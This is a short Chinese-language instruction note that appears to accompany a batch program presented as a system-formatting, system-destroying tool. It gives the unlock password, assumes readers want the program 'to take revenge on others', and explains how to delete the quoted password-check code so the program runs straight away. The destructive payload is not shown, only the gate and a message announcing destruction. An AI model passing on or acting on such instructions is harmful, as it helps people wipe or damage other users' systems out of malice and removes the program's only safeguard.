密码是:
作者将不会对后果负责！
↑就是上面这行

当然,一般人下载这个应该是为了报复别人吧?
所以要把密码去掉,请右键此程序,用记事本打开,把这些代码删除:
@echo off
mode con cols=30 lines=10
set b=5
:pwd
title 密码验证
set /a a=%a%+1
set /a b=%b%-1
set pwd=dingding520
set pwd=""
set /p pwd=请输入密码:
if /I "%pwd%"=="作者将不会对后果负责！" goto main
if /I "%a%"=="5" goto err
echo 错误 %a% 次! 您还有 %b% 次机会!
goto pwd
:err
color c
mode con cols=35 lines=3
title Error!!
cls
echo.
echo 错误次数达到五次,程序即将退出!
ping 127.1 -n 6 >nul
exit
:main
title 已确认您的身份。
cls
echo.
echo 开始格式化并摧毁系统.......
pause

把这些代码删除后再点击运行就是直接运行了,要小心!
